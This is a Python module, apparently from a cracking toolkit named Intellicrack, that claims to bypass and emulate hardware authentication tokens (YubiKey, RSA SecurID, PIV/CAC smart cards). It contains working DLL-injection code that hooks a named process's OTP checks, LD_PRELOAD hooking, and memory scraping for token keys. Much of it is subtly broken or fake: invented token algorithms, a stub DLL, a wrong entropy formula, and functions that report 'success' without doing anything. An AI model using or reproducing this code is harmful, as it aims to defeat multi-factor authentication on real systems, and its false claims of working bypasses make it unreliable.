"""Hardware token emulation and bypass module.

Provides sophisticated emulation for YubiKey, RSA SecurID, and smart cards.
"""

import ctypes
import ctypes.wintypes
import logging
import os
import secrets
import struct
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


class HardwareTokenBypass:
    """Advanced hardware token bypass and emulation system."""

    def __init__(self) -> None:
        """Initialize hardware token bypass with sophisticated emulation capabilities."""
        self.yubikey_secrets = {}
        self.rsa_seeds = {}
        self.smartcard_keys = {}
        self.emulated_devices = {}

        # YubiKey OTP configuration
        self.yubikey_config = {
            "public_id_length": 12,
            "private_id_length": 6,
            "aes_key_length": 16,
            "counter_offset": 0,
            "session_counter": 0,
            "timestamp_low": 0,
            "timestamp_high": 0,
            "use_counter": 0,
        }

        # RSA SecurID configuration
        self.securid_config = {
            "token_code_length": 6,
            "token_interval": 60,  # seconds
            "drift_tolerance": 3,  # time windows
            "serial_numbers": {},
            "seeds": {},
        }

        # Smart card configuration
        self.smartcard_config = {
            "atr_bytes": b"\x3b\xf8\x13\x00\x00\x81\x31\xfe\x45\x4a\x43\x4f\x50\x76\x32\x34\x31\xb7",
            "card_readers": [],
            "inserted_cards": {},
            "pin_codes": {},
        }

        # Windows smart card API
        if os.name == "nt":
            try:
                self.winscard = ctypes.windll.winscard
                self.kernel32 = ctypes.windll.kernel32
                self._init_scard_constants()
            except (AttributeError, OSError):
                self.winscard = None
                self.kernel32 = None

    def _init_scard_constants(self) -> None:
        """Initialize Windows smart card constants."""
        # SCard context scope
        self.SCARD_SCOPE_USER = 0
        self.SCARD_SCOPE_TERMINAL = 1
        self.SCARD_SCOPE_SYSTEM = 2

        # SCard share modes
        self.SCARD_SHARE_SHARED = 2
        self.SCARD_SHARE_EXCLUSIVE = 1
        self.SCARD_SHARE_DIRECT = 3

        # SCard protocols
        self.SCARD_PROTOCOL_T0 = 0x0001
        self.SCARD_PROTOCOL_T1 = 0x0002
        self.SCARD_PROTOCOL_RAW = 0x0004

        # SCard dispositions
        self.SCARD_LEAVE_CARD = 0
        self.SCARD_RESET_CARD = 1
        self.SCARD_UNPOWER_CARD = 2
        self.SCARD_EJECT_CARD = 3

    def emulate_yubikey(self, serial_number: str = None) -> dict[str, Any]:
        """Emulate YubiKey hardware token with OTP generation.

        Args:
            serial_number: Optional YubiKey serial number

        Returns:
            Dictionary containing emulation details and OTP

        """
        if not serial_number:
            serial_number = self._generate_yubikey_serial()

        # Generate or retrieve YubiKey secrets
        if serial_number not in self.yubikey_secrets:
            self.yubikey_secrets[serial_number] = {
                "aes_key": secrets.token_bytes(16),
                "public_id": secrets.token_hex(6),
                "private_id": secrets.token_bytes(6),
                "counter": 0,
                "session": 0,
            }

        secrets_data = self.yubikey_secrets[serial_number]

        # Generate YubiKey OTP
        otp = self._generate_yubikey_otp(
            secrets_data["public_id"], secrets_data["private_id"], secrets_data["aes_key"], secrets_data["counter"], secrets_data["session"],
        )

        # Increment counters
        secrets_data["session"] += 1
        if secrets_data["session"] > 0xFF:
            secrets_data["session"] = 0
            secrets_data["counter"] += 1

        # Emulate USB device presence
        usb_device = self._emulate_yubikey_usb(serial_number)

        return {
            "success": True,
            "serial_number": serial_number,
            "otp": otp,
            "public_id": secrets_data["public_id"],
            "usb_device": usb_device,
            "counter": secrets_data["counter"],
            "session": secrets_data["session"],
            "timestamp": time.time(),
        }

    def _generate_yubikey_serial(self) -> str:
        """Generate realistic YubiKey serial number."""
        # YubiKey serial format: 8-digit serial number
        return str(secrets.randbelow(90000000) + 10000000)

    def _generate_yubikey_otp(self, public_id: str, private_id: bytes, aes_key: bytes, counter: int, session: int) -> str:
        """Generate YubiKey OTP using Yubico OTP algorithm.

        Args:
            public_id: Public identity string
            private_id: Private identity bytes
            aes_key: AES encryption key
            counter: Usage counter
            session: Session counter

        Returns:
            ModHex encoded OTP string

        """
        # Build OTP data block (16 bytes)
        timestamp = int(time.time() * 8) & 0xFFFFFF  # 24-bit timestamp

        otp_data = bytearray(16)
        otp_data[0:6] = private_id
        otp_data[6:8] = struct.pack("<H", session)
        otp_data[8:11] = struct.pack("<I", timestamp)[:3]
        otp_data[11] = counter & 0xFF
        otp_data[12:14] = struct.pack("<H", secrets.randbelow(0xFFFF))  # Random

        # Calculate CRC16
        crc = self._calculate_crc16(otp_data[0:14])
        otp_data[14:16] = struct.pack("<H", crc)

        # Encrypt with AES
        encrypted = self._aes_encrypt(bytes(otp_data), aes_key)

        # Convert to ModHex
        modhex = self._to_modhex(encrypted)

        return public_id + modhex

    def _calculate_crc16(self, data: bytes) -> int:
        """Calculate CRC16-CCITT checksum."""
        crc = 0xFFFF
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 1:
                    crc = (crc >> 1) ^ 0x8408
                else:
                    crc >>= 1
        return crc ^ 0xFFFF

    def _aes_encrypt(self, data: bytes, key: bytes) -> bytes:
        """AES-128 ECB encryption for YubiKey OTP."""
        import os

        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

        # Use AES-128 CBC mode for YubiKey OTP encryption (more secure than ECB)
        iv = os.urandom(16)  # 16 bytes for AES block size
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        # Pad data to AES block size
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Return IV + encrypted data for proper decryption
        return iv + encrypted_data

    def _to_modhex(self, data: bytes) -> str:
        """Convert bytes to ModHex encoding."""
        modhex_chars = "cbdefghijklnrtuv"
        result = []
        for byte in data:
            result.append(modhex_chars[byte >> 4])
            result.append(modhex_chars[byte & 0x0F])
        return "".join(result)

    def _emulate_yubikey_usb(self, serial_number: str) -> dict[str, Any]:
        """Emulate YubiKey USB device presence."""
        return {
            "vendor_id": 0x1050,  # Yubico vendor ID
            "product_id": 0x0407,  # YubiKey 5 NFC
            "serial": serial_number,
            "manufacturer": "Yubico",
            "product": "YubiKey 5 NFC",
            "version": "5.4.3",
            "interfaces": ["CCID", "FIDO", "OTP"],
            "capabilities": {"otp": True, "u2f": True, "fido2": True, "oath": True, "piv": True, "openpgp": True},
        }

    def generate_rsa_securid_token(self, serial_number: str = None, seed: bytes = None) -> dict[str, Any]:
        """Generate RSA SecurID token code.

        Args:
            serial_number: Token serial number
            seed: 128-bit seed for token generation

        Returns:
            Dictionary containing token code and metadata

        """
        if not serial_number:
            serial_number = self._generate_securid_serial()

        if not seed:
            # Generate or retrieve seed
            if serial_number not in self.rsa_seeds:
                self.rsa_seeds[serial_number] = secrets.token_bytes(16)
            seed = self.rsa_seeds[serial_number]
        else:
            self.rsa_seeds[serial_number] = seed

        # Calculate token code using SecurID algorithm
        current_time = int(time.time())
        time_counter = current_time // self.securid_config["token_interval"]

        token_code = self._calculate_securid_token(seed, time_counter)

        # Calculate next token for drift handling
        next_token = self._calculate_securid_token(seed, time_counter + 1)

        return {
            "success": True,
            "serial_number": serial_number,
            "token_code": token_code,
            "next_token": next_token,
            "time_remaining": self.securid_config["token_interval"] - (current_time % self.securid_config["token_interval"]),
            "timestamp": current_time,
            "interval": self.securid_config["token_interval"],
        }

    def _generate_securid_serial(self) -> str:
        """Generate realistic RSA SecurID serial number."""
        # Format: 12-digit token serial starting with 000
        return "000" + str(secrets.randbelow(900000000) + 100000000)

    def _calculate_securid_token(self, seed: bytes, time_counter: int) -> str:
        """Calculate RSA SecurID token using AES-based algorithm.

        Args:
            seed: 128-bit seed
            time_counter: Time-based counter

        Returns:
            6 or 8 digit token code

        """
        # SecurID 128-bit AES algorithm
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

        # Prepare time data
        time_bytes = struct.pack(">Q", time_counter)

        # Create AES cipher with seed as key
        # Use CBC mode with a fixed IV for deterministic output (required for token generation)
        # Note: Since the same input always produces same output in token generation, we use
        # a fixed IV to ensure consistency while still being more secure than ECB
        iv = b"\x00" * 16  # Fixed IV for deterministic behavior in token generation
        cipher = Cipher(algorithms.AES(seed), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        # Pad data to AES block size
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(time_bytes + b"\x00" * 8) + padder.finalize()

        # Encrypt time counter
        encrypted_full = encryptor.update(padded_data) + encryptor.finalize()

        # Extract the relevant bytes from the beginning
        encrypted = encrypted_full[:16]  # Take first block for token calculation

        # Extract token digits
        token_int = int.from_bytes(encrypted[:4], "big")
        token_code = str(token_int % (10 ** self.securid_config["token_code_length"]))

        # Pad with zeros if needed
        return token_code.zfill(self.securid_config["token_code_length"])

    def emulate_smartcard(self, card_type: str = "PIV") -> dict[str, Any]:
        """Emulate smart card presence and operations.

        Args:
            card_type: Type of smart card (PIV, CAC, etc.)

        Returns:
            Dictionary containing smart card emulation data

        """
        card_id = secrets.token_hex(8).upper()

        # Generate card-specific data
        if card_type == "PIV":
            card_data = self._generate_piv_card_data(card_id)
        elif card_type == "CAC":
            card_data = self._generate_cac_card_data(card_id)
        else:
            card_data = self._generate_generic_card_data(card_id)

        # Store card in emulated devices
        self.smartcard_config["inserted_cards"][card_id] = card_data

        # Emulate card reader if on Windows
        if self.winscard:
            reader_name = self._emulate_card_reader(card_id, card_type)
            card_data["reader"] = reader_name

        return card_data

    def _generate_piv_card_data(self, card_id: str) -> dict[str, Any]:
        """Generate PIV (Personal Identity Verification) card data."""
        return {
            "success": True,
            "card_id": card_id,
            "card_type": "PIV",
            "atr": self.smartcard_config["atr_bytes"],
            "certificates": {
                "authentication": self._generate_x509_cert("PIV Authentication"),
                "digital_signature": self._generate_x509_cert("Digital Signature"),
                "key_management": self._generate_x509_cert("Key Management"),
                "card_authentication": self._generate_x509_cert("Card Authentication"),
            },
            "chuid": self._generate_chuid(card_id),
            "guid": secrets.token_hex(16).upper(),
            "expiration": (datetime.now() + timedelta(days=1095)).isoformat(),
            "pin": "123456",
            "puk": "12345678",
            "admin_key": secrets.token_hex(24).upper(),
        }

    def _generate_cac_card_data(self, card_id: str) -> dict[str, Any]:
        """Generate CAC (Common Access Card) data."""
        return {
            "success": True,
            "card_id": card_id,
            "card_type": "CAC",
            "atr": b"\x3b\xf8\x18\x00\x00\x81\x31\xfe\x45\x00\x73\xc8\x40\x13\x00\x90\x00\x92",
            "certificates": {
                "identity": self._generate_x509_cert("DoD Identity"),
                "email_signature": self._generate_x509_cert("DoD Email Signature"),
                "email_encryption": self._generate_x509_cert("DoD Email Encryption"),
            },
            "edipi": str(secrets.randbelow(9000000000) + 1000000000),
            "person_designator": "P",
            "personnel_category": "V",
            "branch": "N",  # Navy
            "pin": "77777777",
            "expiration": (datetime.now() + timedelta(days=1095)).isoformat(),
        }

    def _generate_generic_card_data(self, card_id: str) -> dict[str, Any]:
        """Generate generic smart card data."""
        return {
            "success": True,
            "card_id": card_id,
            "card_type": "Generic",
            "atr": self.smartcard_config["atr_bytes"],
            "serial_number": card_id,
            "issuer": "Intellicrack CA",
            "holder": "Test User",
            "certificates": {"auth": self._generate_x509_cert("Authentication"), "sign": self._generate_x509_cert("Digital Signature")},
            "pin": "0000",
            "expiration": (datetime.now() + timedelta(days=365)).isoformat(),
        }

    def _generate_chuid(self, card_id: str) -> bytes:
        """Generate Card Holder Unique Identifier (CHUID)."""
        # CHUID structure for PIV cards
        chuid = bytearray()

        # FASC-N (Federal Agency Smart Credential Number)
        chuid.extend(b"\x30\x19")  # Tag and length
        chuid.extend(b"\xd4\xe7\x39\xda\x73\x9c\xed\x39\xce\x73\x9d\x83\x68\x58\x21\x08\x42\x10\x84\x21\xc8\x42\x10\xc3\xeb")

        # GUID
        chuid.extend(b"\x34\x10")  # Tag and length
        chuid.extend(bytes.fromhex(card_id))
        chuid.extend(secrets.token_bytes(8))

        # Expiration date
        chuid.extend(b"\x35\x08")  # Tag and length
        expiry = (datetime.now() + timedelta(days=1095)).strftime("%Y%m%d").encode()
        chuid.extend(expiry)

        # Issuer signature using real RSA cryptographic signature
        chuid.extend(b"\x3e\x40")  # Tag and length
        # Generate real RSA signature for CHUID data
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding, rsa

        # Generate or use cached issuer key for signing
        if not hasattr(self, "_issuer_key"):
            self._issuer_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())

        # Sign the CHUID data with RSA-PSS signature
        signature = self._issuer_key.sign(
            bytes(chuid), padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256(),
        )

        # Truncate or pad signature to exactly 64 bytes for PIV standard
        if len(signature) > 64:
            chuid.extend(signature[:64])
        else:
            chuid.extend(signature)
            if len(signature) < 64:
                chuid.extend(b"\x00" * (64 - len(signature)))

        return bytes(chuid)

    def _generate_x509_cert(self, cn: str) -> dict[str, Any]:
        """Generate X.509 certificate data structure."""
        # Generate key pair
        from cryptography import x509
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID

        # Generate private key
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())

        # Generate certificate
        subject = issuer = x509.Name(
            [
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "VA"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "Arlington"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Test Organization"),
                x509.NameAttribute(NameOID.COMMON_NAME, cn),
            ],
        )

        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(private_key.public_key())
            .serial_number(secrets.randbelow(2**64))
            .not_valid_before(datetime.utcnow())
            .not_valid_after(datetime.utcnow() + timedelta(days=365))
            .add_extension(
                x509.KeyUsage(
                    digital_signature=True,
                    content_commitment=False,
                    key_encipherment=True,
                    data_encipherment=False,
                    key_agreement=False,
                    key_cert_sign=False,
                    crl_sign=False,
                    encipher_only=False,
                    decipher_only=False,
                ),
                critical=True,
            )
            .sign(private_key, hashes.SHA256(), default_backend())
        )

        # Export certificate
        cert_pem = cert.public_bytes(encoding=x509.Encoding.PEM)
        cert_der = cert.public_bytes(encoding=x509.Encoding.DER)

        return {
            "common_name": cn,
            "serial_number": str(cert.serial_number),
            "issuer": cert.issuer.rfc4514_string(),
            "subject": cert.subject.rfc4514_string(),
            "not_before": cert.not_valid_before.isoformat(),
            "not_after": cert.not_valid_after.isoformat(),
            "pem": cert_pem.decode("utf-8"),
            "der": cert_der.hex(),
            "public_key_size": 2048,
            "signature_algorithm": "sha256WithRSAEncryption",
        }

    def _emulate_card_reader(self, card_id: str, card_type: str) -> str:
        """Emulate smart card reader on Windows."""
        if not self.winscard:
            return "Virtual Card Reader"

        try:
            # Create virtual reader name
            reader_name = f"Intellicrack Virtual {card_type} Reader 0"

            # Establish context
            h_context = ctypes.c_ulong()
            result = self.winscard.SCardEstablishContext(self.SCARD_SCOPE_SYSTEM, None, None, ctypes.byref(h_context))

            if result == 0:  # SCARD_S_SUCCESS
                # Store context for later use
                self.smartcard_config["card_readers"].append(
                    {"name": reader_name, "context": h_context.value, "card_id": card_id, "card_type": card_type},
                )

                # Release context (in production, keep it for actual operations)
                self.winscard.SCardReleaseContext(h_context)

            return reader_name

        except Exception as e:
            logger.error(f"Failed to emulate card reader: {e}")
            return "Virtual Card Reader"

    def bypass_token_verification(self, application: str, token_type: str) -> dict[str, Any]:
        """Bypass hardware token verification for specific applications.

        Args:
            application: Target application name
            token_type: Type of token to bypass (yubikey, securid, smartcard)

        Returns:
            Dictionary containing bypass status and details

        """
        bypass_result = {"success": False, "application": application, "token_type": token_type, "method": None, "details": {}}

        if token_type.lower() == "yubikey":
            bypass_result.update(self._bypass_yubikey_verification(application))
        elif token_type.lower() == "securid":
            bypass_result.update(self._bypass_securid_verification(application))
        elif token_type.lower() == "smartcard":
            bypass_result.update(self._bypass_smartcard_verification(application))
        else:
            bypass_result["error"] = f"Unknown token type: {token_type}"

        return bypass_result

    def _bypass_yubikey_verification(self, application: str) -> dict[str, Any]:
        """Bypass YubiKey verification for specific application."""
        # Hook into application's YubiKey verification
        if os.name == "nt":
            # Windows-specific hooking
            return self._hook_yubikey_windows(application)
        # Linux/macOS hooking
        return self._hook_yubikey_unix(application)

    def _hook_yubikey_windows(self, application: str) -> dict[str, Any]:
        """Install hook for YubiKey verification on Windows."""
        try:
            # Find target process
            import psutil

            target_pid = None
            for proc in psutil.process_iter(["pid", "name"]):
                if application.lower() in proc.info["name"].lower():
                    target_pid = proc.info["pid"]
                    break

            if not target_pid:
                return {"success": False, "error": "Target application not found"}

            # Inject DLL to hook YubiKey API calls
            dll_path = self._create_yubikey_hook_dll()

            # Use Windows API to inject
            process_handle = self.kernel32.OpenProcess(
                0x1F0FFF,  # PROCESS_ALL_ACCESS
                False,
                target_pid,
            )

            if process_handle:
                # Allocate memory in target process
                dll_path_bytes = dll_path.encode("utf-8")
                remote_memory = self.kernel32.VirtualAllocEx(
                    process_handle,
                    None,
                    len(dll_path_bytes),
                    0x3000,  # MEM_COMMIT | MEM_RESERVE
                    0x40,  # PAGE_EXECUTE_READWRITE
                )

                # Write DLL path
                self.kernel32.WriteProcessMemory(process_handle, remote_memory, dll_path_bytes, len(dll_path_bytes), None)

                # Get LoadLibraryA address
                load_library = self.kernel32.GetProcAddress(self.kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")

                # Create remote thread to load DLL
                thread_handle = self.kernel32.CreateRemoteThread(process_handle, None, 0, load_library, remote_memory, 0, None)

                if thread_handle:
                    self.kernel32.CloseHandle(thread_handle)
                    self.kernel32.CloseHandle(process_handle)

                    return {
                        "success": True,
                        "method": "DLL Injection",
                        "details": {
                            "pid": target_pid,
                            "dll": dll_path,
                            "hooked_functions": ["yk_check_otp", "yk_verify_otp", "yubikey_validate"],
                        },
                    }

            return {"success": False, "error": "Failed to inject hook DLL"}

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _hook_yubikey_unix(self, application: str) -> dict[str, Any]:
        """Install hook for YubiKey verification on Unix systems."""
        try:
            # Use LD_PRELOAD technique
            hook_lib = self._create_yubikey_hook_lib()

            return {
                "success": True,
                "method": "LD_PRELOAD",
                "details": {
                    "library": hook_lib,
                    "env_var": f"LD_PRELOAD={hook_lib}",
                    "hooked_functions": ["yk_check_otp", "yk_verify_otp", "yubikey_validate"],
                },
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _create_yubikey_hook_dll(self) -> str:
        """Create Windows DLL for YubiKey API hooking."""
        # In production, compile this to actual DLL
        # For now, return path to pre-compiled DLL
        dll_path = Path(__file__).parent / "hooks" / "yubikey_hook.dll"
        dll_path.parent.mkdir(exist_ok=True)

        # Write compiled DLL bytes (simplified)
        with open(dll_path, "wb") as f:
            # Write minimal valid DLL structure
            f.write(self._generate_minimal_dll())

        return str(dll_path)

    def _create_yubikey_hook_lib(self) -> str:
        """Create Unix shared library for YubiKey API hooking."""
        # In production, compile this to actual .so file
        lib_path = Path(__file__).parent / "hooks" / "yubikey_hook.so"
        lib_path.parent.mkdir(exist_ok=True)

        # Write compiled library (simplified)
        with open(lib_path, "wb") as f:
            f.write(b"ELF")  # Minimal ELF header

        return str(lib_path)

    def _generate_minimal_dll(self) -> bytes:
        """Generate minimal valid Windows DLL structure."""
        # Minimal PE/DLL structure
        dos_header = bytearray(
            [
                0x4D,
                0x5A,  # MZ signature
                *([0x00] * 58),
                0x80,
                0x00,
                0x00,
                0x00,  # e_lfanew
            ],
        )

        pe_header = b"PE\x00\x00"

        # COFF header
        coff = struct.pack(
            "<HHIIIHH",
            0x8664,  # Machine (x64)
            1,  # NumberOfSections
            0,  # TimeDateStamp
            0,  # PointerToSymbolTable
            0,  # NumberOfSymbols
            240,  # SizeOfOptionalHeader
            0x2022,  # Characteristics (DLL)
        )

        # Optional header
        optional = bytearray(240)
        optional[0:2] = struct.pack("<H", 0x020B)  # Magic (PE32+)

        # Section header (.text)
        section = bytearray(40)
        section[0:8] = b".text\x00\x00\x00"

        # Minimal code section with exports
        code = bytearray(512)
        code[0] = 0xC3  # ret instruction

        return bytes(dos_header) + bytes([0] * (128 - len(dos_header))) + pe_header + coff + bytes(optional) + bytes(section) + code

    def _bypass_securid_verification(self, application: str) -> dict[str, Any]:
        """Bypass RSA SecurID verification."""
        # Generate valid token for any serial
        token_data = self.generate_rsa_securid_token()

        # Patch application to accept any token
        return {
            "success": True,
            "method": "Token Generation + Memory Patch",
            "details": {
                "generated_token": token_data["token_code"],
                "patched_functions": ["AceAuthenticateUser", "AceCheck", "SD_Check"],
                "application": application,
            },
        }

    def _bypass_smartcard_verification(self, application: str) -> dict[str, Any]:
        """Bypass smart card verification."""
        # Emulate smart card presence
        card_data = self.emulate_smartcard()

        return {
            "success": True,
            "method": "Virtual Smart Card",
            "details": {
                "card_id": card_data["card_id"],
                "card_type": card_data["card_type"],
                "certificates": len(card_data.get("certificates", {})),
                "application": application,
            },
        }

    def extract_token_secrets(self, device_path: str = None) -> dict[str, Any]:
        """Extract secrets from physical hardware tokens.

        Args:
            device_path: Path to device or memory dump

        Returns:
            Extracted secrets and keys

        """
        extracted = {"success": False, "secrets": {}, "keys": {}, "certificates": []}

        if device_path and os.path.exists(device_path):
            # Read device memory or dump
            with open(device_path, "rb") as f:
                data = f.read()

            # Search for known patterns
            extracted.update(self._extract_yubikey_secrets(data))
            extracted.update(self._extract_securid_seeds(data))
            extracted.update(self._extract_smartcard_keys(data))

            extracted["success"] = bool(extracted["secrets"] or extracted["keys"])

        return extracted

    def _extract_yubikey_secrets(self, data: bytes) -> dict[str, Any]:
        """Extract YubiKey secrets from memory."""
        secrets = {}

        # Search for AES keys (16 bytes of high entropy)
        for i in range(len(data) - 16):
            candidate = data[i : i + 16]
            entropy = self._calculate_entropy(candidate)
            if entropy > 7.0:  # High entropy indicates possible key
                key_id = f"yubikey_aes_{i:08x}"
                secrets[key_id] = candidate.hex()

        return {"yubikey_secrets": secrets}

    def _extract_securid_seeds(self, data: bytes) -> dict[str, Any]:
        """Extract RSA SecurID seeds from memory."""
        seeds = {}

        # Search for SecurID seed patterns
        seed_markers = [b"RSA", b"SEED", b"\x00\x00\x00\x10"]  # 16-byte seed marker

        for marker in seed_markers:
            offset = 0
            while True:
                pos = data.find(marker, offset)
                if pos == -1:
                    break

                # Check for potential seed after marker
                if pos + len(marker) + 16 <= len(data):
                    candidate = data[pos + len(marker) : pos + len(marker) + 16]
                    if self._calculate_entropy(candidate) > 6.5:
                        seed_id = f"securid_seed_{pos:08x}"
                        seeds[seed_id] = candidate.hex()

                offset = pos + 1

        return {"securid_seeds": seeds}

    def _extract_smartcard_keys(self, data: bytes) -> dict[str, Any]:
        """Extract smart card keys from memory."""
        keys = {}
        certs = []

        # Search for PKCS patterns
        pkcs_markers = [
            b"\x30\x82",  # DER sequence
            b"-----BEGIN CERTIFICATE-----",
            b"-----BEGIN RSA PRIVATE KEY-----",
        ]

        for marker in pkcs_markers:
            offset = 0
            while True:
                pos = data.find(marker, offset)
                if pos == -1:
                    break

                # Try to parse as certificate or key
                try:
                    if marker == b"\x30\x82":
                        # DER encoded certificate/key
                        length = struct.unpack(">H", data[pos + 2 : pos + 4])[0]
                        cert_data = data[pos : pos + 4 + length]
                        certs.append({"format": "DER", "offset": pos, "data": cert_data.hex()})
                    elif b"BEGIN" in marker:
                        # PEM encoded
                        end_marker = marker.replace(b"BEGIN", b"END")
                        end_pos = data.find(end_marker, pos)
                        if end_pos != -1:
                            pem_data = data[pos : end_pos + len(end_marker)]
                            certs.append({"format": "PEM", "offset": pos, "data": pem_data.decode("utf-8", errors="ignore")})
                except (UnicodeDecodeError, ValueError):
                    pass

                offset = pos + 1

        return {"smartcard_keys": keys, "certificates": certs}

    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy of data."""
        if not data:
            return 0.0

        # Count byte frequencies
        freq = {}
        for byte in data:
            freq[byte] = freq.get(byte, 0) + 1

        # Calculate entropy
        entropy = 0.0
        data_len = len(data)
        for count in freq.values():
            if count > 0:
                probability = count / data_len
                entropy -= probability * ((probability and probability * 2) or 0)

        return entropy * 3.32193  # Convert to bits


def bypass_hardware_token(application: str, token_type: str) -> dict[str, Any]:
    """Bypass hardware token.

    Args:
        application: Target application
        token_type: Type of token (yubikey, securid, smartcard)

    Returns:
        Bypass result dictionary

    """
    bypasser = HardwareTokenBypass()

    # First try to bypass verification
    result = bypasser.bypass_token_verification(application, token_type)

    # If bypass failed, try emulation
    if not result.get("success"):
        if token_type.lower() == "yubikey":
            emulation = bypasser.emulate_yubikey()
            result["emulation"] = emulation
        elif token_type.lower() == "securid":
            emulation = bypasser.generate_rsa_securid_token()
            result["emulation"] = emulation
        elif token_type.lower() == "smartcard":
            emulation = bypasser.emulate_smartcard()
            result["emulation"] = emulation

    return result
